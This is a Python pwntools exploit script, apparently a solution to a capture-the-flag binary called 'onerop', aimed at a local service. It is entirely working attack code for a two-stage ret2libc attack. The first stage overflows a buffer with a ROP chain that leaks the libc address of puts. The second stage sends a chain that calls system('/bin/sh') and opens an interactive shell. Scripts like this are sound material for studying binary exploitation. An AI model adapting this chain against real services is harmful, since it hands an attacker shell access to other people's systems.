from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG', terminal='/bin/zsh')
# conn = process('./onerop')
conn = remote("127.0.0.1", 61234)
elf = ELF('./onerop')
libc = ELF('./libc.so.6')
# pwnlib.gdb.attach(proc.pidof(conn)[0])
# gdb.attach(conn)

# Step one Leaking puts() address & return to main() again
main_addr = 0x00000000004011CA
ret_addr = 0x000000000040101a
rdi_ret_addr = 0x00000000004011c5   
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
puts_offsets = libc.symbols['puts']
offset = 0x100 + 0x8
payload1 = b'A'*offset + p64(rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
# pause()
conn.send(payload1)
# conn.interactive();
conn.recvline() #first puts()
received1 = conn.recvline() #second puts() outputs its addr
received1 = received1.strip(b'\n')
received1 = received1.ljust(8, b'\0')
puts_addr = u64(received1)
libc_addr = puts_addr - puts_offsets
log.info("puts_addr => "+ hex(puts_addr))
log.info("libc_addr => 0x{:016X}".format(libc_addr)) 

# Step two Getting system shell

system_addr = libc.symbols['system'] + libc_addr #system函数的地址
bin_sh_addr = next(libc.search('/bin/sh')) + libc_addr #‘/bin/sh’的地址
log.info("bin_sh_addr => {:016X}".format(bin_sh_addr)) 
log.info("system_addr => {:016X}".format(system_addr)) 
payload2 = b'A'*offset + p64(ret_addr) + p64(rdi_ret_addr) + p64(bin_sh_addr) + p64(system_addr)
# pause()
conn.send(payload2)
conn.interactive()